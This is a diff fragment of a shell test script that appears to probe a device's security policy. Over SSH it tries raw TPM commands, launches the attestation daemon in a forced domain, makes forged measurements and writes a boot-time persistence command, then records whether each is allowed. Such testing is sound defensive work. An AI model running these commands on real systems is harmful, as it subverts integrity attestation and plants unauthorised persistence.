@@ -193,7 +193,7 @@ attack)
     "${SSH[@]}" 'for c in "tpm-raw 80020000004100000182000000080000000940000009000000000000000001000b$(printf %064d 0)" \
                           "on -T witnessd_t /system/bin/witnessd -f -p 7651" \
                           "on -T witness_measure_t /proc/boot/witness-measure -p 8 -s forged" \
-                          "witness-report -1 -s 127.0.0.1:9" \
+                          "witness-report -c" \
                           "echo touch /tmp/pwned > /boot/onboot"; do
                      echo "# $c"; sh -c "$c" 2>&1 && echo "  ALLOWED" || echo "  denied"; done'
     # root may write /system/lib and signal the agent: swap the TPM library, kill the agent, see what its supervisor restarts
